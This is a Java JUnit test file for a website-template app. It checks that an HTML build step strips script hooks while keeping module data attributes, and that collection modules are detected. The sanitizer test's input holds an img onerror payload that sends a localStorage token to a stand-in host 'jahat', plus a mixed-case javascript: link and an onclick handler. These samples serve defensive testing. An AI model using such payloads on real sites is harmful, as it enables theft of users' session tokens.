package com.aris.templateapp.site;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/** Modul dinamis website: pembersihan HTML saat build dan deteksi modul untuk Portal Pengurus. */
class SiteModulesTest {

    @Test
    void buildKeepsModuleAttributesButRemovesScriptHooks() {
        Document doc = Jsoup.parse("""
                <div data-ws-list="pengumuman" data-tpl-id="3"><article data-ws-item><h3 data-ws-field="judul">x</h3></article></div>
                <img src="a.png" onerror="fetch('//jahat?'+localStorage.getItem('t'))">
                <a href=" JaVaScript:alert(1)" data-ws-auth="login">Masuk</a>
                <button onclick="x()" data-ws-auth="logout">Keluar</button>""");

        SiteBuildService.stripMarkingAttributes(doc);
        String html = doc.body().html();

        assertThat(html).contains("data-ws-list=\"pengumuman\"", "data-ws-item", "data-ws-field=\"judul\"",
                "data-ws-auth=\"login\"", "data-ws-auth=\"logout\"");
        assertThat(html).doesNotContain("data-tpl-id", "onerror", "onclick", "javascript:");
    }

    @Test
    void templateModulesListsCollectionsWithFieldsExceptNews() {
        Map<String, List<String>> modules = PublicSiteController.templateModules("""
                <div data-ws-list="pengumuman"><div data-ws-item><span data-ws-field="judul"></span></div></div>
                <div data-ws-collection="prestasi"><div data-ws-item>
                  <img data-ws-field="foto"><b data-ws-field="judul"></b><a data-ws-link="link"></a></div></div>""");

        assertThat(modules).containsOnlyKeys("prestasi");
        assertThat(modules.get("prestasi")).containsExactly("foto", "judul", "link");
    }
}
